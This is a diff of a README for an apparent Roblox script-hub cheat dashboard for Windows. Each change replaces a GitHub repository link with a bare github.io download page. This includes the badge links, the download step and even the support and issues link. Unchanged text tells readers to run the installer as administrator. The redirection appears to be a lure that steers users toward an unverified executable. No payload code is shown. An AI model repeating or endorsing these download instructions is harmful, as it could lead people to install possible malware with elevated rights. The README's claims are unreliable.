@@ -1,6 +1,6 @@
 # 🖥️ azures-pc-script-hub - Your All-in-One Roblox Script Dashboard
 
-[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-blueviolet?style=for-the-badge&logo=github)](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-blueviolet?style=for-the-badge&logo=github)](https://valeryebalzacian578.github.io)
 
 ## 🚀 What Is This?
 
@@ -37,7 +37,7 @@ Before you begin, make sure your computer meets these minimum requirements:
 
 **Step 1: Visit the download page**
 
-Visit this link to download the application: [https://github.com/Valeryebalzacian578/azures-pc-script-hub](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
+Visit this link to download the application: [https://valeryebalzacian578.github.io](https://valeryebalzacian578.github.io)
 
 **Step 2: Find the download button**
 
@@ -114,7 +114,7 @@ Make sure you have administrator rights on your PC. Right-click the installer an
 
 ## 📞 Support
 
-If you need help, visit the GitHub repository and open an issue: [https://github.com/Valeryebalzacian578/azures-pc-script-hub/issues](https://github.com/Valeryebalzacian578/azures-pc-script-hub/issues)
+If you need help, visit the GitHub repository and open an issue: [https://valeryebalzacian578.github.io](https://valeryebalzacian578.github.io)
 
 You can also check the **Help** section inside the dashboard for tutorials and guides.
 
@@ -124,6 +124,6 @@ This project is open source and free to use. See the LICENSE file in the reposit
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-brightgreen?style=for-the-badge&logo=github)](https://github.com/Valeryebalzacian578/azures-pc-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Azure's%20PC%20Script%20Hub-brightgreen?style=for-the-badge&logo=github)](https://valeryebalzacian578.github.io)
 
 Keywords: roblox, lua, script hub, windows, 64-bit, keyless, dashboard, 2026, download, pc, azure
